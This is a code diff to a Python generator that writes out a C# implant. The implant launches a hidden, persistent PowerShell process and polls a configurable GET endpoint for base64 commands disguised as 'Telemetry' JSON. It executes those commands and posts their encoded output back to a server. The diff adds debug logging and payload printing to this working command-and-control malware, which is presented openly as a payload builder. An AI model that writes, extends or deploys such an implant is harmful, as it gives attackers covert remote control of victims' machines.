@@ -98,7 +98,7 @@ def make_raw(ip, port, cfg=None, scheme="http"):
 		accept_line = host_line = range_line = ""
 		accept_post = ""
 		sleep_short, sleep_long = 2000, 5000
-		probe_union = '\\"Telemetry\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"|(?:\\"cmd\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\")'
+		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
 		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'
 
 	payload = f"""
@@ -113,6 +113,20 @@ using System.Threading;
 
 class Program
 {{
+
+	static readonly object _logLock = new object();
+	static string _logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "http.log");
+
+	internal static void Log(string msg, Exception ex = null)
+	{{
+		try
+		{{
+			var line = $"[{{DateTime.UtcNow:O}}] {{msg}}" + (ex != null ? $" | EX: {{ex}}" : "");
+			lock (_logLock) File.AppendAllText(_logPath, line + Environment.NewLine, Encoding.UTF8);
+		}}
+		catch {{ /* avoid crashing on logging errors */ }}
+	}}
+
 	static void Main(string[] args)
 	{{
 		// 1) Generate a persistent SID
@@ -121,6 +135,8 @@ class Program
 		// 2) Endpoints (profile-aware)
 		string getUrl  = "{_cs_escape(get_url)}";
 		string postUrl = "{_cs_escape(post_url)}";
+
+		Log($"GetURL: {{getUrl}}, Posturl: {{postUrl}}");
 
 		// 3) Start a hidden, persistent PowerShell process
 		var psi = new ProcessStartInfo {{
@@ -165,13 +181,18 @@ class Program
 				string body;
 				using (var getResp = (HttpWebResponse)getReq.GetResponse())
 				using (var sr      = new StreamReader(getResp.GetResponseStream(), Encoding.UTF8))
-					body = sr.ReadToEnd();
+				body = sr.ReadToEnd();
+				Log($"Got Body: {{body}}");
 
 				var cmdB64 = ParseTelemetry(body);
+				Log($"Got base64cmd {{cmdB64}}");
+
 				if (!string.IsNullOrEmpty(cmdB64))
 				{{
 					var cmdBytes = Convert.FromBase64String(cmdB64);
 					var cmdText  = Encoding.UTF8.GetString(cmdBytes);
+
+					Log($"Got CMD text {{cmdText}}");
 
 					psIn.WriteLine(cmdText);
 					psIn.Flush();
@@ -197,6 +218,7 @@ class Program
 				var outBytes = Encoding.UTF8.GetBytes(outRaw);
 				var outB64   = Convert.ToBase64String(outBytes);
 				var json = {post_json_expr};
+				Log($"Sending JSON: {{json}}");
 
 				var postReq = (HttpWebRequest)WebRequest.Create(postUrl);
 				postReq.Method      = "POST";
@@ -268,7 +290,7 @@ class Program
 	}}
 }}
 """
-	
+	print(payload)
 	return payload
 
 
